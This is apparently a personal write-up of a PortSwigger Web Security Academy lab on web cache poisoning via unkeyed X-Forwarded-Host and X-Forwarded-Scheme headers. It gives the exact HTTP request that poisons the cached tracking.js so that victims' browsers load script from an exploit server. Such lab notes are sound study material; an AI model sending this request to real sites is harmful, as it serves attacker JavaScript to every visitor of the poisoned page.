# [Web cache poisoning with multiple headers] — [PortSwigger] — [Practitioner]
**Date:** 2026-06-27
 
---
 
## Vulnerability / core concept
Web Cache Poisoning

---


## Payload / key command
In this web application, we can notice that home page downloads script from `/resources/js/tracking.js` path. To be able to see this request, we need to disable filtering in burp suite.

After using `Param Finder` we discover that the request supports `X-Forwarded-Host` and `X-Forwarded-Scheme`. 

```bash
GET /resources/js/tracking.js HTTP/2
Host: 0a8b00bc046a842f817afc7900cf00f6.web-security-academy.net
...

X-Forwarded-Scheme: http
X-Forwarded-Host: exploit-0a65009d041a84448137fbfd015e0057.exploit-server.net
```
Here, we need to give `X-Forwarded-Scheme` any value except `https`. This will load a malicious javascript file from our exploit server and home page will execute it in victim's browser.

